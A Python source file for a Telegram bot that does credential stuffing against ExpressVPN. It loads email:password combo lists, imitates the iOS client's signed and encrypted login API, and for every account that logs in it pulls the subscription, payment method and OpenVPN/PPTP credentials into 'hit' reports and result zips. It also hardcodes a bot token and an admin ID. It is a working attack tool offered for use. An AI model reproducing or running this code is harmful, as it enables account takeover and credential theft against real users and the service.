#!/usr/bin/env python3
import sys
import time
import math
import json
import gzip
import hmac
import base64
import hashlib
import string
import random
import zipfile
import tempfile
import threading
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock

import requests
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys

import telebot
from telebot import types
from flask import Flask, request, jsonify

# --- CONFIG ---
BOT_TOKEN = "8824864653:AAEmpXwgdiGLKqLq_VjiIcuvRbfFvcNbDHY"
ADMIN_IDS = {8302326875}  # PALITAN ITO SA IYONG TELEGRAM USER ID
MAX_WORKERS = 4
RATE_LIMIT_MAX = 500
RATE_LIMIT_WINDOW = 900  # 15 min
RESULTS_DIR = "ExpressVPN_Results"

import os
os.makedirs(RESULTS_DIR, exist_ok=True)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
shutdown_event = Event()

# --- FLASK APP FOR UPTIMEROBOT ---
app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "bot": "ExpressVPN Account Checker",
        "time": datetime.now().isoformat(),
        "uptime": "Running"
    })

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "version": "1.0.0"
    })

@app.route('/ping')
def ping():
    return jsonify({"pong": True})

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if data:
            # Process webhook updates
            bot.process_new_updates([telebot.types.Update.de_json(data)])
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    # Get port from environment (Render sets this)
    port = int(os.environ.get('PORT', 5000))
    # Run Flask in a separate thread
    app.run(host='0.0.0.0', port=port)

# --- CRYPTO / API CORE ---

class AesCryptographyService:
    def decrypt(self, data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        padding_length = decrypted[-1]
        if padding_length < 1 or padding_length > 16:
            raise ValueError("Invalid padding")
        return decrypted[:-padding_length]

def get_byte_array(size):
    return get_random_bytes(size)

def envelope_encrypt(input_data, certificate):
    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key
    if hasattr(public_key_info, "parsed"):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info["public_key"].parsed.dump())
    modulus = rsa_public_key["modulus"].native
    public_exponent = rsa_public_key["public_exponent"].native
    rsa_key = RSA.construct((modulus, public_exponent))
    content_key = get_random_bytes(24)
    content_iv = get_random_bytes(8)
    pad_length = 8 - (len(input_data) % 8) if len(input_data) % 8 != 0 else 8
    padded_data = input_data + bytes([pad_length] * pad_length)
    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)
    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)
    recipient_id = cms.IssuerAndSerialNumber({"issuer": issuer, "serial_number": serial_number})
    key_trans_recipient = cms.KeyTransRecipientInfo({
        "version": 0,
        "rid": cms.RecipientIdentifier(name="issuer_and_serial_number", value=recipient_id),
        "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1"}),
        "encrypted_key": cms.OctetString(encrypted_key),
    })
    recipient_infos = cms.RecipientInfos([cms.RecipientInfo(name="ktri", value=key_trans_recipient)])
    encrypted_content_info = cms.EncryptedContentInfo({
        "content_type": "1.2.840.113549.1.7.1",
        "content_encryption_algorithm": cms.EncryptionAlgorithm({
            "algorithm": "1.2.840.113549.3.7",
            "parameters": cms.OctetString(content_iv),
        }),
        "encrypted_content": encrypted_content,
    })
    enveloped_data = cms.EnvelopedData({
        "version": 0,
        "recipient_infos": recipient_infos,
        "encrypted_content_info": encrypted_content_info,
    })
    content_info = cms.ContentInfo({
        "content_type": "1.2.840.113549.1.7.3",
        "content": enveloped_data,
    })
    return content_info.dump()

def gzip_data(input_string):
    input_bytes = input_string.encode("ascii")
    output_stream = BytesIO()
    with gzip.GzipFile(fileobj=output_stream, mode="wb") as gz:
        gz.write(input_bytes)
    return output_stream.getvalue()

def compute_signature(input_data, key):
    signature = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(signature).decode("ascii")

def generate_random_string(length=64):
    return "".join(random.choices(string.hexdigits.lower(), k=length))

def safe_int(value, default=0):
    try:
        if value is None:
            return default
        return int(float(value))
    except (TypeError, ValueError):
        return default

def unix_time_to_date(unix_time):
    try:
        ts = safe_int(unix_time, None)
        if ts is None:
            return "N/A"
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
    except Exception:
        return "N/A"

CERT_BASE64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
    "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
    "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
    "ZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0B"
    "AQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0"
    "u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88Po"
    "cBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxe"
    "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
    "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
    "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKx"
    "XARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1i"
    "XJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8"
    "krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYw"
    "fp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPSt"
    "NzOuxZ4BXLe7YA=="
)
HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"

def format_valid_hit_text(account_data, is_premium):
    lines = []
    lines.append("-------------------------------------------------------")
    lines.append("  EXPRESSVPN ACCOUNT REPORT")
    lines.append("-------------------------------------------------------")
    lines.append(f"  EMAIL             : {account_data.get('email', 'N/A')}")
    lines.append(f"  PASSWORD          : {account_data.get('password', 'N/A')}")
    lines.append(f"  PLAN              : {'PREMIUM' if is_premium else 'FREE'}")
    lines.append(f"  LICENSE STATUS    : {account_data.get('license_status', 'N/A')}")
    if account_data.get("plan_name") and account_data["plan_name"] not in ("Not Provided", "N/A", None):
        lines.append(f"  PLAN NAME         : {account_data['plan_name']}")
    if account_data.get("billing_cycle"):
        lines.append(f"  BILLING CYCLE     : {account_data['billing_cycle']} months")
    if account_data.get("expire_date") and account_data["expire_date"] not in ("Not Provided", "N/A"):
        lines.append(f"  EXPIRY DATE       : {account_data['expire_date']}")
    if account_data.get("days_left") is not None and account_data["days_left"] not in ("Not Provided", "N/A"):
        lines.append(f"  DAYS LEFT         : {account_data['days_left']}")
    if account_data.get("auto_renew") and account_data["auto_renew"] not in ("Not Provided", "N/A"):
        lines.append(f"  AUTO RENEW        : {account_data['auto_renew']}")
    if account_data.get("payment_method") and account_data["payment_method"] not in ("Not Provided", "N/A"):
        lines.append(f"  PAYMENT METHOD    : {account_data['payment_method']}")
    if account_data.get("currency") and account_data["currency"] not in ("Not Provided", "N/A"):
        lines.append(f"  CURRENCY          : {account_data['currency']}")
    if account_data.get("country") and account_data["country"] not in ("Not Provided", "N/A"):
        lines.append(f"  COUNTRY           : {account_data['country']}")
    if account_data.get("subscription_created") and account_data["subscription_created"] not in ("Not Provided", "N/A"):
        lines.append(f"  SUBSCRIPTION CREATED : {account_data['subscription_created']}")
    if account_data.get("trial_ends") and account_data["trial_ends"] not in ("Not Provided", "N/A"):
        lines.append(f"  TRIAL ENDS        : {account_data['trial_ends']}")
    lines.append("-------------------------------------------------------")
    lines.append("  OPENVPN CREDENTIALS")
    lines.append(f"    Username : {account_data.get('ovpn_username', 'N/A')}")
    lines.append(f"    Password : {account_data.get('ovpn_password', 'N/A')}")
    lines.append("  PPTP CREDENTIALS")
    lines.append(f"    Username : {account_data.get('pptp_username', 'N/A')}")
    lines.append(f"    Password : {account_data.get('pptp_password', 'N/A')}")
    lines.append("-------------------------------------------------------")
    if account_data.get("last_login") and account_data["last_login"] not in ("Not Provided", "N/A"):
        lines.append(f"  LAST LOGIN        : {account_data['last_login']}")
    if account_data.get("account_created") and account_data["account_created"] not in ("Not Provided", "N/A"):
        lines.append(f"  ACCOUNT CREATED   : {account_data['account_created']}")
    lines.append("-------------------------------------------------------")
    lines.append("  Powered by @maisanyvokei | @maisanyvokei")
    lines.append("-------------------------------------------------------")
    return "\n".join(lines)

def check_account(email, password):
    """
    Returns:
      status: 'premium' | 'free' | 'invalid'
      data: dict with account fields (or error message)
    """
    account_data = {"email": email, "password": password}
    try:
        install_id = generate_random_string(64)
        base64_iv = base64.b64encode(get_byte_array(16)).decode("ascii")
        base64_key = base64.b64encode(get_byte_array(16)).decode("ascii")
        post_data = json.dumps({
            "email": email,
            "iv": base64_iv,
            "key": base64_key,
            "password": password,
        })
        cert_bytes = base64.b64decode(CERT_BASE64)
        gzipped_data = gzip_data(post_data)
        try:
            encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
        except Exception as e:
            return "invalid", f"Encryption failed: {e}"

        header_raw = (
            f"POST /apis/v2/credentials?client_version=11.5.2"
            f"&installation_id={install_id}&os_name=ios&os_version=14.4"
        )
        header_signature = compute_signature(header_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        body_signature = compute_signature(encrypted_post_data, HMAC_KEY.encode("ascii"))
        url = (
            f"https://www.expressapisv2.net/apis/v2/credentials"
            f"?client_version=11.5.2&installation_id={install_id}"
            f"&os_name=ios&os_version=14.4"
        )
        headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "Expect": "",
            "Content-Type": "application/octet-stream",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {header_signature} 91c776e",
            "X-Body-Signature": f"2 {body_signature} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
        }

        try:
            resp = requests.post(url, data=encrypted_post_data, headers=headers, timeout=30)
        except Exception as e:
            return "invalid", f"Request failed: {e}"

        if resp.status_code == 401:
            return "invalid", "401 Unauthorized / wrong credentials"
        if resp.status_code == 429:
            time.sleep(5)
            return check_account(email, password)  # simple retry
        if resp.status_code != 200:
            return "invalid", f"HTTP {resp.status_code}"

        try:
            aes = AesCryptographyService()
            plain = aes.decrypt(resp.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
            resp_json = json.loads(plain.decode("ascii"))
        except Exception as e:
            return "invalid", f"Decryption failed: {e}"

        for k in ("ovpn_username", "ovpn_password", "pptp_username", "pptp_password"):
            if k in resp_json:
                account_data[k] = resp_json[k]

        access_token = resp_json.get("access_token")
        if not access_token:
            account_data["license_status"] = "NO_SUBSCRIPTION"
            return "free", account_data

        # subscription batch
        sub_raw = (
            f"GET /apis/v2/subscription?access_token={access_token}"
            f"&client_version=11.5.2&installation_id={install_id}"
            f"&os_name=ios&os_version=14.4&reason=activation_with_email"
        )
        sub_sig = compute_signature(sub_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        batch_raw = (
            f"POST /apis/v2/batch?client_version=11.5.2"
            f"&installation_id={install_id}&os_name=ios&os_version=14.4"
        )
        batch_sig = compute_signature(batch_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        capture_body = json.dumps([{
            "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_sig} 91c776e"},
            "method": "GET",
            "url": (
                f"/apis/v2/subscription?access_token={access_token}"
                f"&client_version=11.5.2&installation_id={install_id}"
                f"&os_name=ios&os_version=14.4&reason=activation_with_email"
            ),
        }])
        capture_body_sig = compute_signature(capture_body.encode("ascii"), HMAC_KEY.encode("ascii"))
        batch_url = (
            f"https://www.expressapisv2.net/apis/v2/batch"
            f"?client_version=11.5.2&installation_id={install_id}"
            f"&os_name=ios&os_version=14.4"
        )
        batch_headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {batch_sig} 91c776e",
            "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }

        try:
            br = requests.post(batch_url, data=capture_body, headers=batch_headers, timeout=30)
        except Exception:
            account_data["license_status"] = "BATCH_FAIL"
            return "free", account_data

        if br.status_code == 429:
            time.sleep(5)
            return check_account(email, password)
        if br.status_code != 200:
            account_data["license_status"] = f"BATCH_HTTP_{br.status_code}"
            return "free", account_data

        try:
            batch_data = br.json()
        except Exception:
            account_data["license_status"] = "BATCH_JSON_ERROR"
            return "free", account_data

        if not batch_data:
            account_data["license_status"] = "EMPTY_BATCH"
            return "free", account_data

        item = batch_data[0]
        item_code = item.get("code") or item.get("status")
        if item_code == 429:
            time.sleep(5)
            return check_account(email, password)

        sub_data = item.get("body", "{}")
        if isinstance(sub_data, str):
            sub_data = sub_data.replace('\\"', '"')
            try:
                sub_json = json.loads(sub_data)
            except Exception:
                account_data["license_status"] = "SUB_JSON_ERROR"
                return "free", account_data
        elif isinstance(sub_data, dict):
            sub_json = sub_data
        else:
            account_data["license_status"] = "SUB_INVALID_TYPE"
            return "free", account_data

        if "subscription" in sub_json:
            sub_json = sub_json["subscription"]

        billing_cycle = sub_json.get("billing_cycle")
        if billing_cycle:
            account_data["billing_cycle"] = billing_cycle
            account_data["plan"] = f"{billing_cycle} Month"
        if "expiration_time" in sub_json:
            exp_time = sub_json["expiration_time"]
            account_data["expire_date"] = unix_time_to_date(exp_time)
            try:
                exp_ts = safe_int(exp_time, None)
                if exp_ts is not None:
                    account_data["days_left"] = int((exp_ts - int(datetime.now().timestamp())) / 86400)
                else:
                    account_data["days_left"] = "N/A"
            except Exception:
                account_data["days_left"] = "N/A"
        if "auto_bill" in sub_json:
            account_data["auto_renew"] = str(sub_json["auto_bill"]).lower()
        if "payment_method" in sub_json:
            account_data["payment_method"] = sub_json["payment_method"]
        license_status = str(sub_json.get("license_status", "")).upper()
        account_data["license_status"] = license_status
        if "plan_name" in sub_json and sub_json["plan_name"]:
            account_data["plan_name"] = sub_json["plan_name"]
        if "currency" in sub_json:
            account_data["currency"] = sub_json["currency"]
        if "country" in sub_json:
            account_data["country"] = sub_json["country"]
        if "created_at" in sub_json:
            account_data["subscription_created"] = sub_json["created_at"]
        if "trial_end_time" in sub_json:
            account_data["trial_ends"] = sub_json["trial_end_time"]

        # optional account info
        try:
            acc_info = fetch_account_info(access_token, install_id)
            if acc_info:
                if "created_at" in acc_info:
                    account_data["account_created"] = acc_info["created_at"]
                if "last_login_time" in acc_info:
                    account_data["last_login"] = acc_info["last_login_time"]
        except Exception:
            pass

        if license_status == "REVOKED":
            return "free", account_data
        if license_status in ("ACTIVE", "TRIAL", "PAID"):
            exp_time = sub_json.get("expiration_time")
            exp_ts = safe_int(exp_time, 0)
            if exp_ts and exp_ts > int(datetime.now().timestamp()):
                account_data["is_premium"] = True
                return "premium", account_data
            return "free", account_data
        return "free", account_data

    except Exception as e:
        return "invalid", str(e)[:120]

def fetch_account_info(access_token, install_id):
    raw = (
        f"GET /apis/v2/account?access_token={access_token}"
        f"&client_version=11.5.2&installation_id={install_id}"
        f"&os_name=ios&os_version=14.4"
    )
    sig = compute_signature(raw.encode("ascii"), HMAC_KEY.encode("ascii"))
    url = (
        f"https://www.expressapisv2.net/apis/v2/account"
        f"?access_token={access_token}&client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "X-Signature": f"2 {sig} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }
    try:
        resp = requests.get(url, headers=headers, timeout=30)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return None

# --- IP INFO ---

def get_my_ip_info():
    try:
        resp = requests.get("http://ip-api.com/json/", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "ip": data.get("query", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "asn": data.get("as", "Unknown"),
                    "timezone": data.get("timezone", "Unknown"),
                }
    except Exception:
        pass
    return None

def build_lua_ip_snippet(info):
    # use <pre> so it works with parse_mode=HTML
    if not info:
        return (
            "<pre>"
            "-- network info unavailable\n"
            "local net = { ip = \"unknown\" }\n"
            "print(net.ip)"
            "</pre>"
        )
    # escape any & < > that might appear in ISP/city names for HTML safety
    def esc(s):
        return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    ip = esc(info["ip"])
    country = esc(info["country"])
    region = esc(info["region"])
    city = esc(info["city"])
    isp = esc(info["isp"])
    asn = esc(info["asn"])
    timezone = esc(info["timezone"])

    lua = (
        "<pre>"
        "-- ExpressVPN Analyzer - network probe\n"
        "local net = {\n"
        f"    ip       = \"{ip}\",\n"
        f"    country  = \"{country}\",\n"
        f"    region   = \"{region}\",\n"
        f"    city     = \"{city}\",\n"
        f"    isp      = \"{isp}\",\n"
        f"    asn      = \"{asn}\",\n"
        f"    timezone = \"{timezone}\"\n"
        "}\n"
        "\n"
        "print(\"IP: \" .. net.ip)\n"
        "print(\"Location: \" .. net.city .. \", \" .. net.region .. \", \" .. net.country)\n"
        "print(\"ISP: \" .. net.isp)\n"
        "print(\"ASN: \" .. net.asn)\n"
        "print(\"Timezone: \" .. net.timezone)"
        "</pre>"
    )
    return lua

# --- SESSION STATE ---

user_sessions = {}  # chat_id -> state dict
sessions_lock = Lock()

def get_session(chat_id):
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {
                "accounts": [],
                "running": False,
                "stop": False,
                "stats": {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0},
                "premium_hits": [],
                "free_hits": [],
                "invalid_hits": [],
                "status_msg_id": None,
                "start_time": None,
            }
        return user_sessions[chat_id]

# --- TELEGRAM HANDLERS ---

def is_allowed(user_id):
    return user_id in ADMIN_IDS

@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "Access denied.")
        return

    info = get_my_ip_info()
    lua_block = build_lua_ip_snippet(info)

    welcome = (
        "<b>EXPRESSVPN ACCOUNT ANALYZER</b>\n"
        "Telegram Bot edition\n\n"
        "Send a .txt file with lines in format:\n"
        "<code>email:password</code>\n\n"
        "Or paste combos directly.\n\n"
        "<b>Commands</b>\n"
        "/start - this menu\n"
        "/check - start checking loaded accounts\n"
        "/status - live progress\n"
        "/stop - stop current job\n"
        "/results - get zip of results\n"
        "/clear - clear loaded accounts\n\n"
        "<b>Network probe (Lua)</b>\n"
        f"{lua_block}"
    )
    bot.reply_to(message, welcome)

@bot.message_handler(commands=["clear"])
def cmd_clear(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Stop the current job first with /stop")
        return
    session["accounts"] = []
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0}
    bot.reply_to(message, "Session cleared.")

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if not session["running"]:
        bot.reply_to(message, "Nothing is running.")
        return
    session["stop"] = True
    bot.reply_to(message, "Stop signal sent. Finishing current workers...")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    s = session["stats"]
    total = s["total"] or 1
    pct = (s["checked"] / total) * 100 if total else 0
    bar_len = 20
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    text = (
        f"<b>LIVE STATS</b>\n"
        f"<code>{bar}</code> {pct:.1f}%\n\n"
        f"Premium : <b>{s['premium']}</b>\n"
        f"Free    : <b>{s['free']}</b>\n"
        f"Invalid : <b>{s['invalid']}</b>\n"
        f"Checked : {s['checked']}/{s['total']}\n"
        f"Running : {'yes' if session['running'] else 'no'}"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["results"])
def cmd_results(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job still running. Wait or /stop first.")
        return

    premium = session["premium_hits"]
    free = session["free_hits"]
    invalid = session["invalid_hits"]

    if not premium and not free and not invalid:
        bot.reply_to(message, "No results yet. Load accounts and /check first.")
        return

    with tempfile.TemporaryDirectory() as tmp:
        valid_path = os.path.join(tmp, "valid.txt")
        invalid_path = os.path.join(tmp, "invalid.txt")
        premium_path = os.path.join(tmp, "premium.txt")
        free_path = os.path.join(tmp, "free.txt")

        with open(valid_path, "w", encoding="utf-8") as f:
            for hit in premium + free:
                f.write(format_valid_hit_text(hit, hit.get("is_premium", False)) + "\n\n" + "=" * 50 + "\n\n")
        with open(premium_path, "w", encoding="utf-8") as f:
            for hit in premium:
                f.write(format_valid_hit_text(hit, True) + "\n\n" + "=" * 50 + "\n\n")
        with open(free_path, "w", encoding="utf-8") as f:
            for hit in free:
                f.write(format_valid_hit_text(hit, False) + "\n\n" + "=" * 50 + "\n\n")
        with open(invalid_path, "w", encoding="utf-8") as f:
            for item in invalid:
                f.write(f"{item}\n")

        zip_path = os.path.join(tmp, "ExpressVPN_Results.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(valid_path, "valid.txt")
            zf.write(premium_path, "premium.txt")
            zf.write(free_path, "free.txt")
            zf.write(invalid_path, "invalid.txt")

        caption = (
            f"<b>Results</b>\n"
            f"Premium: {len(premium)}\n"
            f"Free: {len(free)}\n"
            f"Invalid: {len(invalid)}"
        )
        with open(zip_path, "rb") as f:
            bot.send_document(message.chat.id, f, caption=caption)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job running. /stop first.")
        return

    doc = message.document
    if not doc.file_name.lower().endswith(".txt"):
        bot.reply_to(message, "Send a .txt file with email:password lines.")
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode("utf-8", errors="ignore")
        lines = [ln.strip() for ln in content.splitlines() if ln.strip() and ":" in ln]
        # dedupe while preserving order
        seen = set()
        unique = []
        for ln in lines:
            if ln not in seen:
                seen.add(ln)
                unique.append(ln)
        session["accounts"] = unique
        session["premium_hits"] = []
        session["free_hits"] = []
        session["invalid_hits"] = []
        session["stats"] = {
            "checked": 0,
            "total": len(unique),
            "premium": 0,
            "free": 0,
            "invalid": 0,
        }
        bot.reply_to(
            message,
            f"Loaded <b>{len(unique)}</b> accounts (duplicates removed).\n"
            f"Send /check to start.",
        )
    except Exception as e:
        bot.reply_to(message, f"Failed to read file: {e}")

@bot.message_handler(commands=["check"])
def cmd_check(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Already running. /status or /stop")
        return
    if not session["accounts"]:
        bot.reply_to(message, "No accounts loaded. Send a .txt file first.")
        return

    session["running"] = True
    session["stop"] = False
    session["start_time"] = datetime.now()
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {
        "checked": 0,
        "total": len(session["accounts"]),
        "premium": 0,
        "free": 0,
        "invalid": 0,
    }

    status_msg = bot.reply_to(
        message,
        "<b>Starting check...</b>\n"
        f"Total: {len(session['accounts'])}\n"
        "Live stats every 5 seconds.",
    )
    session["status_msg_id"] = status_msg.message_id

    def worker():
        accounts = list(session["accounts"])
        stats_lock = Lock()
        last_update = 0

        def update_status(force=False):
            nonlocal last_update
            now = time.time()
            if not force and (now - last_update) < 5:
                return
            last_update = now
            s = session["stats"]
            total = s["total"] or 1
            pct = (s["checked"] / total) * 100
            bar_len = 20
            filled = int(bar_len * pct / 100)
            bar = "█" * filled + "░" * (bar_len - filled)
            text = (
                f"<b>LIVE STATS</b>\n"
                f"<code>{bar}</code> {pct:.1f}%\n\n"
                f"Premium : <b>{s['premium']}</b>\n"
                f"Free    : <b>{s['free']}</b>\n"
                f"Invalid : <b>{s['invalid']}</b>\n"
                f"Checked : {s['checked']}/{s['total']}"
            )
            try:
                bot.edit_message_text(
                    text,
                    chat_id=message.chat.id,
                    message_id=session["status_msg_id"],
                )
            except Exception:
                pass

        def process_one(combo):
            if session["stop"] or shutdown_event.is_set():
                return
            if ":" not in combo:
                with stats_lock:
                    session["stats"]["checked"] += 1
                    session["stats"]["invalid"] += 1
                    session["invalid_hits"].append(combo)
                return
            email, password = combo.split(":", 1)
            email = email.strip()
            password = password.strip()
            status, data = check_account(email, password)

            with stats_lock:
                session["stats"]["checked"] += 1
                if status == "premium":
                    session["stats"]["premium"] += 1
                    session["premium_hits"].append(data)
                    # send full hit immediately
                    try:
                        report = format_valid_hit_text(data, True)
                        bot.send_message(
                            message.chat.id,
                            f"<b>PREMIUM HIT</b>\n<pre>{report}</pre>",
                        )
                    except Exception:
                        pass
                elif status == "free":
                    session["stats"]["free"] += 1
                    session["free_hits"].append(data)
                    try:
                        report = format_valid_hit_text(data, False)
                        bot.send_message(
                            message.chat.id,
                            f"<b>FREE / VALID</b>\n<pre>{report}</pre>",
                        )
                    except Exception:
                        pass
                else:
                    session["stats"]["invalid"] += 1
                    reason = data if isinstance(data, str) else "unknown"
                    session["invalid_hits"].append(f"{email}:{password} | {reason}")
                    # show first few invalid reasons so flow is visible
                    if session["stats"]["invalid"] <= 3:
                        try:
                            bot.send_message(
                                message.chat.id,
                                f"<b>INVALID</b>\n<code>{email}:{password}</code>\nReason: {reason}",
                            )
                        except Exception:
                            pass
            time.sleep(0.8)  # gentle pacing
            update_status()

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(process_one, acc) for acc in accounts]
            for fut in as_completed(futures):
                if session["stop"] or shutdown_event.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result()
                except Exception:
                    pass
                update_status()

        session["running"] = False
        update_status(force=True)

        s = session["stats"]
        duration = (datetime.now() - session["start_time"]).total_seconds()
        summary = (
            f"<b>CHECK COMPLETE</b>\n\n"
            f"Premium : <b>{s['premium']}</b>\n"
            f"Free    : <b>{s['free']}</b>\n"
            f"Invalid : <b>{s['invalid']}</b>\n"
            f"Checked : {s['checked']}/{s['total']}\n"
            f"Time    : {int(duration // 60)}m {int(duration % 60)}s\n\n"
            f"Use /results to download the zip."
        )
        try:
            bot.send_message(message.chat.id, summary)
        except Exception:
            pass

    t = threading.Thread(target=worker, daemon=True)
    t.start()

@bot.message_handler(func=lambda m: m.text and ":" in m.text and not m.text.startswith("/"))
def handle_text_combos(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job running. /stop first.")
        return
    lines = [ln.strip() for ln in message.text.splitlines() if ln.strip() and ":" in ln]
    if not lines:
        return
    seen = set()
    unique = []
    for ln in lines:
        if ln not in seen:
            seen.add(ln)
            unique.append(ln)
    session["accounts"] = unique
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {
        "checked": 0,
        "total": len(unique),
        "premium": 0,
        "free": 0,
        "invalid": 0,
    }
    bot.reply_to(
        message,
        f"Loaded <b>{len(unique)}</b> accounts from text.\nSend /check to start.",
    )

# --- KEEP ALIVE FUNCTION ---
def keep_alive():
    """Function to keep the bot alive by pinging itself"""
    time.sleep(60)  # Wait 60 seconds before first ping
    while not shutdown_event.is_set():
        try:
            # Get the Render URL from environment or use localhost
            url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
            if url != 'http://localhost:5000':
                requests.get(f"{url}/ping", timeout=10)
                print(f"Keep-alive ping sent at {datetime.now()}")
        except Exception as e:
            print(f"Keep-alive error: {e}")
        time.sleep(300)  # Ping every 5 minutes

